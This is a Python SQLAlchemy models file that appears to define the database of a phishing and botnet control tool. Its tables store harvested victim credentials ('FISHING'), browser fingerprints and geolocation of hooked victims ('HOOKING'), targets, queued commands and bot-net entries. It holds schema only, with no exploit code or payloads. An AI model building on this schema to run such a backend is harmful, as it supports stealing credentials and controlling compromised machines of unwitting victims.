from sqlalchemy import Column, String, Integer, Text, ForeignKey
from sqlalchemy.ext.declarative import declarative_base

Base = declarative_base()

class Users(Base):
    __tablename__ = 'USERS'
    email = Column(String(50), primary_key=True)
    password = Column(String(20))

    def __init__(self, email, password):
        self.email = email
        self.password = password

    def __repr__(self):
        return f"[{self.email},{self.password}]"



class Fishing(Base):
    __tablename__ = 'FISHING'
    ID = Column(String, primary_key=True)
    email = Column(String(20), ForeignKey('USERS.email'))
    ip = Column(String(50))
    username = Column(String(50))
    password = Column(String(20))

    def __init__(self, ID, email, ip, username, password):
        self.ID = ID
        self.email = email
        self.ip = ip
        self.username = username
        self.password = password

    def __repr__(self):
        return f"[{self.ID},{self.email},{self.ip},{self.username},{self.password}]"

class Hooking(Base):
    __tablename__ = 'HOOKING'

    ID = Column(String, primary_key=True)
    email = Column(String(20), ForeignKey('USERS.email'))
    ip = Column(String(20))
    lon = Column(Integer)
    lat = Column(Integer)
    screen_h = Column(Integer)
    screen_w = Column(Integer)
    app_name = Column(Text)
    app_code_name = Column(String(20))
    product_name = Column(String(50))
    user_agent = Column(Text)
    platform = Column(String(50))

    def __init__(self, ID, email, ip, lon, lat, screen_h, screen_w, app_name, app_code_name, product_name, user_agent, platform):
        self.ID = ID
        self.email = email
        self.ip = ip
        self.lon = lon
        self.lat = lat
        self.screen_h = screen_h
        self.screen_w = screen_w
        self.app_name = app_name
        self.app_code_name = app_code_name
        self.product_name = product_name
        self.user_agent = user_agent
        self.platform = platform

    def __repr__(self):
        return f"[{self.ID},{self.email},{self.ip},{self.lon},{self.lat},{self.screen_h},{self.screen_w},{self.app_name},{self.app_code_name},{self.product_name},{self.user_agent},{self.platform}]"


class ApiToken(Base):
    __tablename__ = 'API_TOKEN'
    ID = Column(String, primary_key=True)
    token = Column(String(50))
    user_email = Column(String(20),ForeignKey('USERS.email'))

    def __init__(self, ID, token, user_email):
        self.ID = ID
        self.token = token
        self.user_email = user_email

    def __repr__(self):
        return f"[{self.ID},{self.token},{self.user_email}]"


class Targets(Base):
    __tablename__ = 'TARGETS'
    target_name = Column(String(50),primary_key=True)
    user_email = Column(String(20),ForeignKey('USERS.email'))
    token = Column(String,ForeignKey('API_TOKEN.token'))

    def __init__(self, target_name, user_email,token):
        self.target_name = target_name
        self.user_email = user_email
        self.token = token

    def __repr__(self):
        return f"[{self.target_name},{self.user_email},{self.token}]"

# only hold one information per a person and it will get update everytime he/she change Instraction
class Instraction(Base):
    __tablename__ = 'INSTRACTION'
    ID = Column(String, primary_key=True)
    delay = Column(Integer)
    target_name = Column(String,ForeignKey('TARGETS.target_name'),primary_key=True)
    instraction = Column(String)
    stutas = Column(String)

    def __init__(self ,ID , delay, target_name, instraction,stutas):
        self.ID = ID
        self.delay = delay
        self.target_name = target_name
        self.instraction = instraction
        self.stutas = stutas # active and Inactive


    def __repr__(self):
        return f"[{self.ID},{self.delay},{self.target_name},{self.instraction},{self.stutas}]"


class APICommand(Base):
    __tablename__ = 'API_COMMAND'
    ID = Column(String, primary_key=True)
    email = Column(String(20), ForeignKey('USERS.email'))
    target_name = Column(String,ForeignKey('TARGETS.target_name'))
    cmd = Column(String(20))
    condition = Column(Text)

    def __init__(self, ID, email, target_name, cmd, condition):
        self.ID = ID
        self.email = email
        self.target_name = target_name
        self.cmd = cmd
        self.condition = condition

    def __repr__(self):
        return f"[{self.ID},{self.email},{self.target_name},{self.cmd},{self.condition}]"


class APILink(Base):
    __tablename__ = 'API_LINK'
    ID = Column(String, primary_key=True)
    email = Column(String(20), ForeignKey('USERS.email'))
    target_name = Column(String,ForeignKey('TARGETS.target_name'))
    link = Column(String(20))
    action_type = Column(Text)
    condition = Column(Integer)

    def __init__(self, ID, email, target_name, link, action_type, condition):
        self.ID = ID
        self.email = email
        self.target_name = target_name
        self.link = link
        self.action_type = action_type
        self.condition = condition

    def __repr__(self):
        return f"[{self.ID},{self.email},{self.target_name},{self.link},{self.action_type},{self.condition}]"


class BotNet(Base):
    __tablename__ = 'BOT_NET'
    ID = Column(String, primary_key=True)
    token = Column(String,ForeignKey('API_TOKEN.token'))
    target_name = Column(String,ForeignKey('TARGETS.target_name'))
    botNetType = Column(String)
    status = Column(String)

    def __init__(self , ID, target_name, botNetType, token, status):
        self.ID = ID
        self.token = token
        self.target_name = target_name
        self.botNetType = botNetType
        self.status = status


    def __repr__(self):
        return f"[{self.ID},{self.token},{self.target_name},{self.botNetType},{self.status}]"
